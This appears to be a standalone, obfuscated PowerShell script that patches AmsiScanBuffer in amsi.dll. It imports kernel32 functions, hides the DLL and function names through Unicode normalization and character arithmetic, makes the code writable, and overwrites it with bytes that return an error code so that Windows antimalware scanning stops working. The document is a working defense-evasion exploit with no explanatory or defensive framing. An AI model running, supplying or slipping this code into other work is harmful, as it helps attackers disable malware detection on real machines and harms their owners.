$r9XaNlhvGsQNuakgz4Hk = @"
using System;
using System.Runtime.InteropServices;
public class r9XaNlhvGsQNuakgz4Hk {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lSVgHW7, string hXVp);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr C3bp3yUP7, UIntPtr CFevhdwuPpaNq2p7z8Kj, uint BDBTAiQ7, out uint JbG6KU6N7uyhgJR);
}
"@

Add-Type $r9XaNlhvGsQNuakgz4Hk

$BvpMAhEcY3bLSU6h = [r9XaNlhvGsQNuakgz4Hk]::LoadLibrary("$(('ãmsí.'+'dll').normaliZe([chAr]([BYtE]0x46)+[ChAr]([BYTe]0x6f)+[CHAr](86+28)+[CHAr]([ByTe]0x6d)+[chAr](68+14-14)) -replace [chAr]([byTe]0x5c)+[cHAR]([bYTe]0x70)+[cHAr]([byte]0x7b)+[ChAr](47+30)+[cHAR]([byTe]0x6e)+[CHar]([byTe]0x7d))")
$jdvRMZpof79ZqizeZzj = [r9XaNlhvGsQNuakgz4Hk]::GetProcAddress($BvpMAhEcY3bLSU6h, "$(('ÃmsîScânBù'+'ffêr').NOrMALiZE([ChAr]([Byte]0x46)+[ChaR]([bYTe]0x6f)+[ChAr]([bYTE]0x72)+[cHAr](109)+[cHaR]([bytE]0x44)) -replace [cHAr](6+86)+[cHaR]([ByTe]0x70)+[cHar]([BYTE]0x7b)+[chAr](7+70)+[Char](110+14-14)+[ChaR](14+111))")
$p = 0
[r9XaNlhvGsQNuakgz4Hk]::VirtualProtect($jdvRMZpof79ZqizeZzj, [uint32]5, 0x40, [ref]$p)
$VdiGLZ1VJCkbLfCDQZQ = "0xB8"
$ME2l = "0x57"
$CAHrckqheR6r = "0x00"
$rH9JR0tWl = "0x07"
$zfXL7h5fWrdp = "0x80"
$nkbJq = "0xC3"
$GH_zbl = [Byte[]] ($VdiGLZ1VJCkbLfCDQZQ,$ME2l,$CAHrckqheR6r,$rH9JR0tWl,+$zfXL7h5fWrdp,+$nkbJq)
[System.Runtime.InteropServices.Marshal]::Copy($GH_zbl, 0, $jdvRMZpof79ZqizeZzj, 6)